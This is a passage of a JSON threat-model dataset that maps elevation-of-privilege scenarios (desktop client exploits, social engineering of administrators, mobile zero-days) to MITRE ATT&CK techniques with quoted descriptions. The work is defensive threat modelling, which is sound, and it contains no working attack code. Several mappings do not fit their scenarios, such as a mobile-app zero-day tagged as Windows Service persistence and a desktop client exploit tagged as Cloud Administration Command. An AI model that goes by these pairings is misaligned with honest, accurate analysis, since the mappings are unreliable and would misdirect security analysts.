                "id": "attack-pattern--18cffc21-3260-437e-80e4-4ab8bf2ba5e9",
                "technique_id": "T1499.003"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits a vulnerability in the companion desktop client to gain administrative access.",
            "Assumptions": [
                {
                    "Assumption": "The companion desktop client has exploitable vulnerabilities.",
                    "Role": "System",
                    "Condition": "Code vulnerabilities in desktop client software"
                },
                {
                    "Assumption": "Admin rights in desktop clients are insufficiently protected.",
                    "Role": "System",
                    "Condition": "Lack of secure privilege management"
                },
                {
                    "Assumption": "There is insufficient monitoring and patch management for desktop clients.",
                    "Role": "System",
                    "Condition": "Lack of timely software updates and monitoring"
                }
            ],
            "Potential Impact": "Full system access for attackers, leading to unauthorized actions and data breaches.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "desktop client",
                "vulnerability exploitation",
                "administrative access",
                "system control"
            ],
            "mitre_technique": {
                "name": "Cloud Administration Command",
                "description": "Adversaries may abuse cloud management services to execute commands within virtual machines. Resources such as AWS Systems Manager, Azure RunCommand, and Runbooks allow users to remotely run scripts in virtual machines by leveraging installed virtual machine agents. (Citation: AWS Systems Manager Run Command)(Citation: Microsoft Run Command)\n\nIf an adversary gains administrative access to a cloud environment, they may be able to abuse cloud management services to execute commands in the environment\u2019s virtual machines. Additionally, an adversary that compromises a service provider or delegated administrator account may similarly be able to leverage a [Trusted Relationship](https://attack.mitre.org/techniques/T1199) to execute commands in connected virtual machines.(Citation: MSTIC Nobelium Oct 2021)",
                "id": "attack-pattern--d94b3ae9-8059-4989-8e9f-ea0f601f80a7",
                "technique_id": "T1651"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker uses social engineering to trick administrative staff into providing high-level access credentials.",
            "Assumptions": [
                {
                    "Assumption": "Administrative staff may fall victim to social engineering attacks.",
                    "Role": "Admin Staff",
                    "Condition": "Effective social engineering tactics"
                },
                {
                    "Assumption": "Security awareness training is lacking or ineffective.",
                    "Role": "Organization",
                    "Condition": "Inadequate training and awareness initiatives"
                },
                {
                    "Assumption": "Multiple sensitive tasks can be performed with higher privilege accounts.",
                    "Role": "System",
                    "Condition": "High-privilege accounts are over-permitted"
                }
            ],
            "Potential Impact": "Unauthorized administrative access leading to extensive data breaches and system manipulation.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "social engineering",
                "high-level access",
                "credential theft",
                "unauthorized access"
            ],
            "mitre_technique": {
                "name": "Spearphishing Link",
                "description": "Spearphishing with a link is a specific variant of spearphishing. It is different from other forms of spearphishing in that it employs the use of links to download malware contained in email, instead of attaching malicious files to the email itself, to avoid defenses that may inspect email attachments. \n\nAll forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this case, the malicious emails contain links. Generally, the links will be accompanied by social engineering text and require the user to actively click or copy and paste a URL into a browser, leveraging [User Execution](https://attack.mitre.org/techniques/T1204). The visited website may compromise the web browser using an exploit, or the user will be prompted to download applications, documents, zip files, or even executables depending on the pretext for the email in the first place. Adversaries may also include links that are intended to interact directly with an email reader, including embedded images intended to exploit the end system directly or verify the receipt of an email (i.e. web bugs/web beacons). Links may also direct users to malicious applications  designed to [Steal Application Access Token](https://attack.mitre.org/techniques/T1528)s, like OAuth tokens, in order to gain access to protected applications and information.(Citation: Trend Micro Pawn Storm OAuth 2017)",
                "id": "attack-pattern--20138b9d-1aac-4a26-8654-a36b6bbf2bba",
                "technique_id": "T1192"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker leverages a zero-day vulnerability in the mobile application to execute arbitrary code with elevated privileges.",
            "Assumptions": [
                {
                    "Assumption": "Zero-day vulnerabilities remain unpatched and present in the application.",
                    "Role": "System",
                    "Condition": "Ongoing zero-day vulnerability exposure"
                },
                {
                    "Assumption": "Attackers have access to the tools needed to exploit the vulnerability.",
                    "Role": "Attacker",
                    "Condition": "Availability of exploitation tools and techniques"
                },
                {
                    "Assumption": "Mobile application privilege management does not mitigate the risk effectively.",
                    "Role": "System",
                    "Condition": "Weak privilege segregation in mobile app design"
                }
            ],
            "Potential Impact": "Complete control over application and user data resulting in severe data breaches and potential malware distribution.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "zero-day exploitation",
                "arbitrary code execution",
                "mobile application",
                "privilege escalation"
            ],
            "mitre_technique": {
                "name": "Windows Service",
                "description": "Adversaries may create or modify Windows services to repeatedly execute malicious payloads as part of persistence. When Windows boots up, it starts programs or applications called services that perform background system functions.(Citation: TechNet Services) Windows service configuration information, including the file path to the service's executable or recovery programs/commands, is stored in the Windows Registry.\n\nAdversaries may install a new service or modify an existing service to execute at startup in order to persist on a system. Service configurations can be set or modified using system utilities (such as sc.exe), by directly modifying the Registry, or by interacting directly with the Windows API. \n\nAdversaries may also use services to install and execute malicious drivers. For example, after dropping a driver file (ex: `.sys`) to disk, the payload can be loaded and registered via [Native API](https://attack.mitre.org/techniques/T1106) functions such as `CreateServiceW()` (or manually via functions such as `ZwLoadDriver()` and `ZwSetValueKey()`), by creating the required service Registry values (i.e. [Modify Registry](https://attack.mitre.org/techniques/T1112)), or by using command-line utilities such as `PnPUtil.exe`.(Citation: Symantec W.32 Stuxnet Dossier)(Citation: Crowdstrike DriveSlayer February 2022)(Citation: Unit42 AcidBox June 2020) Adversaries may leverage these drivers as [Rootkit](https://attack.mitre.org/techniques/T1014)s to hide the presence of malicious activity on a system. Adversaries may also load a signed yet vulnerable driver onto a compromised machine (known as \"Bring Your Own Vulnerable Driver\" (BYOVD)) as part of [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068).(Citation: ESET InvisiMole June 2020)(Citation: Unit42 AcidBox June 2020)\n\nServices may be created with administrator privileges but are executed under SYSTEM privileges, so an adversary may also use a service to escalate privileges. Adversaries may also directly start services through [Service Execution](https://attack.mitre.org/techniques/T1569/002).\n\nTo make detection analysis more challenging, malicious services may also incorporate [Masquerade Task or Service](https://attack.mitre.org/techniques/T1036/004) (ex: using a service and/or payload name related to a legitimate OS or benign software component). Adversaries may also create \u2018hidden\u2019 services (i.e., [Hide Artifacts](https://attack.mitre.org/techniques/T1564)), for example by using the `sc sdset` command to set service permissions via the Service Descriptor Definition Language (SDDL). This may hide a Windows service from the view of standard service enumeration methods such as `Get-Service`, `sc query`, and `services.exe`.(Citation: SANS 1)(Citation: SANS 2)",
                "id": "attack-pattern--2959d63f-73fd-46a1-abd2-109d7dcede32",
                "technique_id": "T1543.003"
            }
        }
    ]
}
]